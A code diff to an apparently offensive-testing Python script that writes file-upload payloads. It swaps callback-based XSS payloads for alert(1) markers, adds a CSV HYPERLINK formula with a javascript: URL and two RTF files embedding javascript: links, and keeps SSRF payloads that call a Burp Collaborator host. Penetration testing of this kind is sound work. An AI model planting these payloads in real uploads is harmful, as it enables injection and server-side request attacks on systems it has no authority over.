@@ -16,15 +16,21 @@ def generate_text_payloads(output_dir, ext, burp_collab):
         rce_dir = output_dir / 'rce'
         rce_dir.mkdir(exist_ok=True)
         
-        xss1_script = f"<script>fetch('{base_url}/xss-{ext}-script')</script>"
+        xss1_script = f"<script>alert(1)</script>"
         output_file = xss_dir / f"xss1_script.{ext}"
         with open(output_file, 'w', encoding='utf-8') as f:
             f.write(xss1_script)
         
-        xss2_img = f"<img src=x onerror=fetch('{base_url}/xss-{ext}-img')>"
+        xss2_img = f"<img src=x onerror=alert(1)>"
         output_file = xss_dir / f"xss2_img.{ext}"
         with open(output_file, 'w', encoding='utf-8') as f:
             f.write(xss2_img)
+        
+        if ext == 'csv':
+            xss3_hyperlink = f'=HYPERLINK("javascript:alert(1)","click")'
+            output_file = xss_dir / f"xss3_hyperlink.{ext}"
+            with open(output_file, 'w', encoding='utf-8') as f:
+                f.write(xss3_hyperlink)
         
         ssrf1_http = f"http://{burp_collab}/ssrf-{ext}-1"
         if ext == 'rtf':
@@ -36,6 +42,24 @@ def generate_text_payloads(output_dir, ext, burp_collab):
             output_file = ssrf_dir / f"ssrf1_hyperlink.{ext}"
             with open(output_file, 'w', encoding='utf-8') as f:
                 f.write(rtf_content)
+            
+            rtf_xss1_hyperlink = f'''{{\\rtf1\\ansi\\deff0
+{{\\fonttbl{{\\f0 Times New Roman;}}}}
+\\f0\\fs24 
+\\field{{\\*\\fldinst {{ HYPERLINK "javascript:alert(1)" }}}}{{\\fldrslt Click here}}
+}}'''
+            output_file = xss_dir / f"xss1_hyperlink.{ext}"
+            with open(output_file, 'w', encoding='utf-8') as f:
+                f.write(rtf_xss1_hyperlink)
+            
+            rtf_xss2_object = f'''{{\\rtf1\\ansi\\deff0
+{{\\fonttbl{{\\f0 Times New Roman;}}}}
+\\f0\\fs24 
+{{\\object\\objdata javascript:alert(1)}}
+}}'''
+            output_file = xss_dir / f"xss2_object.{ext}"
+            with open(output_file, 'w', encoding='utf-8') as f:
+                f.write(rtf_xss2_object)
         else:
             output_file = ssrf_dir / f"ssrf1_http.{ext}"
             with open(output_file, 'w', encoding='utf-8') as f:
